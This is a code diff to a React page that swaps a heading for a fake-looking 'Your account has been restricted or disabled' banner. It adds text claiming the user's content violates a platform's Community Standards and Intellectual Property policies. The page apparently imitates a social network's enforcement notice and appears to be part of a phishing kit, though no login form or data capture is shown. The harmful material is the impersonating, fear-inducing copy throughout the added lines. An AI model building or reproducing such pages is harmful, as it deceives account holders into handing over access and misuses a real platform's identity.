@@ -38,14 +38,32 @@ const HomePage = () => {
     <div className="bg-[url('images/background.png')] bg-no-repeat bg-cover flex items-center justify-center">
       <div className="max-w-[1280px] w-full px-4 flex md:flex-row flex-col items-center md:gap-0 gap-8 justify-between py-6">
         <div className="md:max-w-[50%] max-w-full w-full md:min-h-0 min-h-[300px] flex flex-col items-start text-left justify-center">
-          <h1 className="font-[700] text-[32px] mb-3">
+          {/* <h1 className="font-[700] text-[32px] mb-3">
             Violation of Community Standards
-          </h1>
-          <p className="text-[16px] mb-2">
+          </h1> */}
+                      <img
+              src="images/zxc0KBED1gpJ.svg"
+              className="md:w-7 md:h-7 w-8 h-8"
+              alt=""
+            />
+            <b className="font-700 md:text-3xl text-2xl">
+              Your account has been restricted or disabled
+            </b>
+          {/* <p className="text-[16px] mb-2">
             Our technology and review teams help detect and review content that
             may violate our policies. When we find content that doesn’t follow
             our Community Standards, we may remove it and take action on the
             account responsible.
+          </p> */}
+          <p className="mb-2 text-gray-800">
+            We determined that some activity on your account may not follow our
+            Community Standards.
+          </p>
+          <p className="text-gray-800">
+            In particular, we found content that may violate our Intellectual
+            Property policies, which include protections for copyrights and
+            trademarks. When users repeatedly share content that violates these
+            policies, we may take additional actions on their accounts.
           </p>
         </div>
         <div className="md:max-w-[50%] max-w-full w-full md:min-h-0 min-h-[300px] flex items-center justify-center">
@@ -55,7 +73,7 @@ const HomePage = () => {
     </div>
     <div className="border-b border-[#E0E0E0]">
       <div className="my-10 px-4 max-w-[1280px] w-full mx-auto">
-        <div className="w-full mb-5">
+        {/* <div className="w-full mb-5">
           <div className="flex md:items-center items-start md:flex-row flex-col justify-start gap-3 mb-3">
             <img
               src="images/zxc0KBED1gpJ.svg"
@@ -76,7 +94,7 @@ const HomePage = () => {
             trademarks. When users repeatedly share content that violates these
             policies, we may take additional actions on their accounts.
           </p>
-        </div>
+        </div> */}
         <div className="w-full mb-5 border-b border-[#E0E0E0] pb-5">
           <p className="mb-[10px] font-[600] text-[18px]">Why this happened</p>
           <p className="text-[15px] mb-2">
